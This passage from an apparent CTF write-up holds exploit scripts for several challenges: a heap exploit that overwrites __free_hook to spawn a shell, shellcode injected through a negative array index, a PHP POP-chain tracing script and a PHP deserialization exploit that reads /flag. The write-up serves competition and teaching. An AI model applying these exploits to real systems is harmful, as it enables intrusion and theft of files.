string">'./baby_diary'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token comment">#context.log_level="debug"</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x4c60</span><span class="token punctuation">)</span>                      <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span>                      add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>                        delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span>                     add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x801</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>i<span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p8<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token operator">+</span><span class="token number">0x801</span><span class="token operator">-</span><span class="token number">0x251</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x800</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0xfb0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    show<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    leak_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    main_arena_offset<span class="token operator">=</span><span class="token number">0x1ebb80</span>    libc_base<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    success<span class="token punctuation">(</span><span class="token string">'libc:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x700</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token comment">#sh=process("./baby_diary")</span>        sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'8.140.114.72'</span><span class="token punctuation">,</span> <span class="token number">1399</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="强网先锋-orw-SOLVED-NN"><a href="#强网先锋-orw-SOLVED-NN" class="headerlink" title="[强网先锋]orw | SOLVED | NN"></a>[强网先锋]orw | SOLVED | NN</h2><p>对elf文件ida打开后分析可知存在下标越界和输入无限制漏洞。</p><p>指针数组的下标v1没有检查</p><p>直接回车，就能无限输入，摆脱大小限制。</p><p>直接利用下标越界，申请一个chunk分配给-25的位置，在输入shellcode实现orw，最后触发。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./orw')</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.131.68'</span><span class="token punctuation">,</span><span class="token number">12354</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./orw'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    shellcode<span class="token operator">=</span><span class="token triple-quoted-string string">'''    xor rax, rax    xor rdi, rdi    xor rsi, rsi    xor rdx, rdx    mov rax, 2    mov rdi, 0x67616c662f2e    push rdi    mov rdi, rsp    syscall    mov rdx, 0x100    mov rsi, rdi    mov rdi, rax    mov rax, 0    syscall    mov rdi, 1    mov rax, 1    syscall'''</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-25'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h1><h2 id="pop-mater-SOLVED-Hn13"><a href="#pop-mater-SOLVED-Hn13" class="headerlink" title="pop_mater | SOLVED | Hn13"></a>pop_mater | SOLVED | Hn13</h2><p>直接写脚本回溯POP链：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getmVar</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    pos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span>method <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> i<span class="token punctuation">[</span>pos <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">:</span>pos <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">getmMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    mflag <span class="token operator">=</span> <span class="token number">0</span>    mtmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> method <span class="token keyword">in</span> i<span class="token punctuation">:</span>            <span class="token triple-quoted-string string">'''if "public function " in i:                print("get defination:" )                print(i)                break'''</span>            <span class="token keyword">if</span> <span class="token string">"->"</span> <span class="token operator">+</span> method <span class="token operator">+</span> <span class="token string">"("</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get invocation in line "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>mflag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                mVar <span class="token operator">=</span> getmVar<span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span>                tmflag <span class="token operator">=</span> mflag                <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                    <span class="token triple-quoted-string string">'''if mVar + " = " + mVar in mtmp:                        s = ""                        ifexp = lines[tmflag]                        ifexpnum = re.findall("[(](.*?)[)]", ifexp)                        s = s.join(ifexpnum)                        if eval(s):                            print("var has been polluted by method 's ifexp")                            print(ifexp)                            print("----------------------")                            return'''</span>                    <span class="token keyword">if</span> mVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                    mtmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tmflag<span class="token punctuation">]</span>                    tmflag <span class="token operator">-=</span> <span class="token number">1</span>                mpos <span class="token operator">=</span> mtmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>                mMethod <span class="token operator">=</span> mtmp<span class="token punctuation">[</span>mpos <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">:</span>mpos <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"method's method is "</span><span class="token operator">+</span>mMethod<span class="token punctuation">)</span>                <span class="token keyword">if</span> mMethod <span class="token operator">!=</span> <span class="token string">"U710q7"</span><span class="token punctuation">:</span>                    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> mMethod<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get!!!!!!!!!"</span><span class="token punctuation">)</span>                    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        mflag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">geteMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> tflag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>        <span class="token comment"># 查找是否有直接赋值污染变量</span>        <span class="token keyword">if</span> eVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token comment"># 查找是否有if语句后污染变量</span>        <span class="token triple-quoted-string string">'''if eVar+" = "+eVar+"." in tmp:            s = ""            ifexp = lines[tflag]            ifexpnum = re.findall("[(](.*?)[)]", ifexp)            s = s.join(ifexpnum)            if eval(s):                print("var has been polluted by ifexp")                print("----------------------")                return'''</span>        tmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tflag<span class="token punctuation">]</span>        tflag <span class="token operator">-=</span> <span class="token number">1</span>    mpos <span class="token operator">=</span> tmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>    method <span class="token operator">=</span> tmp<span class="token punctuation">[</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">:</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eval's method is "</span> <span class="token operator">+</span> method<span class="token punctuation">)</span>    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No FOUND"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geteVar</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    epos <span class="token operator">=</span> e<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> e<span class="token punctuation">[</span>epos <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">:</span>epos <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">geteval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        num <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-------------------------------"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get eval in line"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", total:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>                eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eVar is "</span> <span class="token operator">+</span> eVar<span class="token punctuation">)</span>                geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>                num <span class="token operator">+=</span> <span class="token number">1</span>            flag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>            epos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>            eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>            <span class="token keyword">break</span>        flag<span class="token operator">+=</span><span class="token number">1</span>geteval<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag{42a17bce-75b3-4e4e-a073-e5ec1bb4a218}</p><h2 id="赌徒-done-Err0r"><a href="#赌徒-done-Err0r" class="headerlink" title="赌徒 | done | Err0r"></a>赌徒 | done | Err0r</h2><p>扫目录发现<code>www.zip</code></p><p>发现是反序列化，exp：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token single-quoted-string string">'ok'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hi"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$cc</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"give you flag : "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$promise</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">promise</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">promise</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ffiillee</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ffiilleennaammee'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Room</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token single-quoted-string string">'/flag'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token 